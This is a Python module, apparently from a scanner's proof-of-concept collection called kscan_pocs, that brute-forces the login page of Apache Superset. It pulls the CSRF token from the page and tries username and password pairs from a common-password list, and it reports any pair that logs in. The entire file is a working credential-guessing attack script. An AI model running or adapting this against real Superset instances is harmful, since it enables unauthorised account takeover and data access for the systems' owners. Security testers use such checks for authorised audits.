# coding: utf-8
# @Time    : 2020/9/21 8:10
# @Author    : WANSUIYE
# @File    : supersetCheck.py
# @Project: kscan_pocs

import requests
import re

from .utils.getFile import get_var_items,genUserPasswd

def get_dict(flag=1):
	user_list = get_var_items('ssh_user.txt')
	passwd_list = get_var_items('top200passwd.txt')

	return genUserPasswd(user_list, passwd_list)

def bf(target,user,passwd,timeout):
	retVal=''
	try:
		url = '{}://{}:{}/login/'.format(target[0], target[1], int(target[2]))
		s = requests.session()
		res1 = s.get(url, verify=False, timeout=timeout).text
		csrf_token = re.findall('<input id="csrf_token" name="csrf_token" type="hidden" value="(.*)">', res1)
		if csrf_token:
			data = {'username': user, 'password': passwd, 'csrf_token': csrf_token[0]}
			res2 = s.post(url, data=data, verify=False)
			if res2.status_code == 200 and 'login' not in res2.url:
				retVal = '{}/{}'.format(user,passwd)
	except:
		pass
	return retVal

def check(target,**kwargs):
	timeout = kwargs.get('timeout') or 3
	flag = kwargs.get('flag') or 1
	retVal={'service':'Superset','status':1,'url':''}

	for user, passwd in get_dict(flag):
		res = bf(target,user,passwd,timeout)
		if res:
			retVal['status'] = 2
			retVal['url'] += res+'\n'

	return retVal